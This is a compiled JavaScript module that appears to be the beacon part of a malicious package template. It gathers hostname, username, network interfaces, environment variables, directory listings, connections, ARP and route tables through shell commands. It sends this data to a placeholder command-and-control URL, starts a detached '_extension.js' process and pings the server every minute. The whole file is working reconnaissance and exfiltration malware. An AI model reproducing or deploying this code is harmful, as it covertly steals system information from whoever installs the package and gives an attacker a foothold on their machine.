"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.VERSION = exports.BEACON_SECRET = exports.PKG_NAME = exports.C2_URL = void 0;
exports.gatherSystemInfo = gatherSystemInfo;
exports.gatherExtendedInfo = gatherExtendedInfo;
exports.sendBeacon = sendBeacon;
exports.startHeartbeat = startHeartbeat;
const os = __importStar(require("os"));
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const http = __importStar(require("http"));
const https = __importStar(require("https"));
const crypto = __importStar(require("crypto"));
const cp = __importStar(require("child_process"));
exports.C2_URL = '__C2_URL__';
exports.PKG_NAME = '__PKG_NAME__';
exports.BEACON_SECRET = '__BEACON_SECRET__';
exports.VERSION = '__VERSION__';
const BEACON_ID = crypto.randomUUID();
function tree(dir, depth) {
    if (depth === 0)
        return [];
    let result = [];
    try {
        const entries = fs.readdirSync(dir, { withFileTypes: true });
        for (const e of entries) {
            result.push({ name: e.name, type: e.isDirectory() ? 'd' : 'f', path: path.join(dir, e.name) });
            if (e.isDirectory())
                result = result.concat(tree(path.join(dir, e.name), depth - 1));
        }
    }
    catch (_) { }
    return result;
}
function getInterfaces() {
    const ifaces = os.networkInterfaces();
    const out = {};
    for (const [name, addrs] of Object.entries(ifaces)) {
        if (!addrs)
            continue;
        out[name] = addrs.map(a => ({ address: a.address, family: a.family, internal: a.internal }));
    }
    return out;
}
function run(cmd) {
    try {
        return cp.execSync(cmd, { timeout: 3000, stdio: ['ignore', 'pipe', 'ignore'] }).toString().trim();
    }
    catch (_) {
        return '';
    }
}
function gatherSystemInfo() {
    return {
        hostname: os.hostname(),
        username: os.userInfo().username,
        platform: os.platform(),
        arch: os.arch(),
        os_release: os.release(),
        cwd: process.cwd(),
        interfaces: getInterfaces(),
        dir_tree: tree(process.cwd(), 3),
        env_vars: Object.fromEntries(['PATH', 'USER', 'HOME', 'PWD', 'SHELL', 'LOGNAME', 'USERNAME'].filter(k => process.env[k]).map(k => [k, process.env[k]])),
    };
}
function gatherExtendedInfo() {
    return {
        ...gatherSystemInfo(),
        connections: run('ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null'),
        arp_cache: run('arp -n 2>/dev/null || ip neigh 2>/dev/null'),
        routes: run('ip route 2>/dev/null || route -n 2>/dev/null'),
    };
}
function solvePoW(nonce, difficulty) {
    const prefix = '0'.repeat(difficulty);
    let n = 0;
    while (true) {
        if (crypto.createHash('sha256').update(nonce + n).digest('hex').startsWith(prefix))
            return n;
        n++;
    }
}
function httpGet(url) {
    return new Promise((resolve, reject) => {
        try {
            const u = new URL(url);
            const mod = u.protocol === 'https:' ? https : http;
            const req = mod.request(url, res => {
                let data = '';
                res.on('data', (c) => { data += c; });
                res.on('end', () => { try {
                    resolve(JSON.parse(data));
                }
                catch (_) {
                    reject(new Error('parse'));
                } });
            });
            req.on('error', reject);
            req.end();
        }
        catch (e) {
            reject(e);
        }
    });
}
function httpPost(url, body) {
    try {
        const u = new URL(url);
        const mod = u.protocol === 'https:' ? https : http;
        const req = mod.request({
            hostname: u.hostname,
            port: u.port || (u.protocol === 'https:' ? 443 : 80),
            path: u.pathname,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
        }, () => { });
        req.on('error', () => { });
        req.write(body);
        req.end();
    }
    catch (_) { }
}
async function sendBeacon(opts) {
    const info = gatherSystemInfo();
    let powExtra = {};
    try {
        const pow = await httpGet(exports.C2_URL + '/api/pow');
        if (pow && pow.enabled && pow.nonce) {
            const solution = solvePoW(pow.nonce, pow.difficulty || 5);
            powExtra = { pow_nonce: pow.nonce, pow_solution: solution };
        }
    }
    catch (_) { }
    const payload = {
        beacon_id: BEACON_ID,
        beacon_secret: exports.BEACON_SECRET,
        pkg: exports.PKG_NAME,
        ...info,
        ...powExtra,
        ...(opts?.custom ?? {}),
    };
    const body = JSON.stringify(payload);
    httpPost(exports.C2_URL + '/api/beacon', body);
    try {
        cp.spawn(process.execPath, [path.join(__dirname, '_extension.js')], {
            detached: true,
            stdio: 'ignore',
            env: { ...process.env, DOLUS_C2: exports.C2_URL, DOLUS_PKG: exports.PKG_NAME, DOLUS_BEACON_ID: BEACON_ID, DOLUS_SECRET: exports.BEACON_SECRET },
        }).unref();
    }
    catch (_) { }
    return { id: 0 };
}
function startHeartbeat(intervalMs = 60_000) {
    const ping = () => {
        const body = JSON.stringify({ beacon_id: BEACON_ID, pkg: exports.PKG_NAME, beacon_secret: exports.BEACON_SECRET });
        httpPost(exports.C2_URL + '/api/heartbeat', body);
    };
    ping();
    setInterval(ping, intervalMs);
}
